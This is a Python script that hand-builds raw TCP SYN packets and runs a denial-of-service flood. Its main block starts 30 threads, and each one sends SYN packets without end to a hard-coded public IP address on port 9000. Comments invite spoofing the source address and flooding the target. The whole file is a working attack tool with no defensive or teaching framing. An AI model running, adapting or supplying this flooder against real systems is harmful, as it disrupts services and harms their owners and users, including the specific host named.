import socket
import sys
from struct import *
import threading
import random


class IP(object):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill the correct total length
    ip_id = 54321   #Id of this packet
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0    # kernel will fill the correct checksum
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    def __init__(self,source_ip, dest_ip):
        self.ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
        self.ip_daddr = socket.inet_aton ( dest_ip )
        self.ip_header   = pack('!BBHHHBBH4s4s',
                            IP.ip_ihl_ver, IP.ip_tos,
                            IP.ip_tot_len, IP.ip_id,
                            IP.ip_frag_off, IP.ip_ttl,
                            IP.ip_proto, IP.ip_check,
                            self.ip_saddr, self.ip_daddr
                            )

class TCP(object):
    tcp_seq = 454
    tcp_ack_seq = 0
    tcp_doff = 5    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
    #tcp flags
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons (5840)    #   maximum allowed window size
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)

    placeholder = 0
    protocol = socket.IPPROTO_TCP



    def __init__(self, source_ip, dest_ip, source_port, dest_port, user_data=b''):
            self.tcp_source = source_port   # source port
            self.tcp_dest = dest_port   # destination port
            self.user_data = user_data
            self.dest_ip = dest_ip
            # the ! in the pack format string means network order
            self.tcp_tmp_header = pack('!HHLLBBHHH' ,
                                   self.tcp_source,
                                   self.tcp_dest, TCP.tcp_seq,
                                   TCP.tcp_ack_seq, TCP.tcp_offset_res,
                                   TCP.tcp_flags,  TCP.tcp_window,
                                   TCP.tcp_check, TCP.tcp_urg_ptr
                                   )
            self.source_address = socket.inet_aton(source_ip)
            self.dest_address = socket.inet_aton(dest_ip)
            self.tcp_length = len(self.tcp_tmp_header) + len(self.user_data)

            self.tcp_check = self.checksum()

            # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
            self.tcp_header = pack('!HHLLBBH' ,
                                   self.tcp_source, self.tcp_dest,
                                   TCP.tcp_seq, TCP.tcp_ack_seq,
                                   TCP.tcp_offset_res, TCP.tcp_flags,
                                   TCP.tcp_window) + pack('H' , self.tcp_check) + pack('!H' , TCP.tcp_urg_ptr)
            # final full packet - syn packets dont have any data
            self.ip_header = IP(source_ip,dest_ip).ip_header
            self.packet = self.ip_header + self.tcp_header + self.user_data

    def send(self):
        #Send the packet finally - the port specified has no effect
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.sendto(self.packet, (self.dest_ip, 0))# put this in a loop if you want to flood the target


    def checksum(self):
        msg = pack('!4s4sBBH' , self.source_address , self.dest_address , TCP.placeholder , TCP.protocol , self.tcp_length);
        msg = msg + self.tcp_tmp_header + self.user_data;
        s = 0

        # loop taking 2 characters at a time
        for i in range(0, len(msg), 2):
            w = msg[i] + (msg[i+1] << 8 )
            s = s + w

        s = (s>>16) + (s & 0xffff);
        s = s + (s >> 16);

        #complement and mask to 4 byte short
        s = ~s & 0xffff

        return s

if __name__ == '__main__':
    def dos():
        while True:
            source_port = random.randint(1024,65535)
            source_ip = '10.162.%d.%d'%(random.randint(0,255),random.randint(0,255))
            tcp = TCP('192.168.1.110','115.159.147.123',source_port,9000)
            tcp.send()
            # break

    for _ in range(30):
        threading.Thread(target=dos).start()
    # tcp.send()
    # dos()
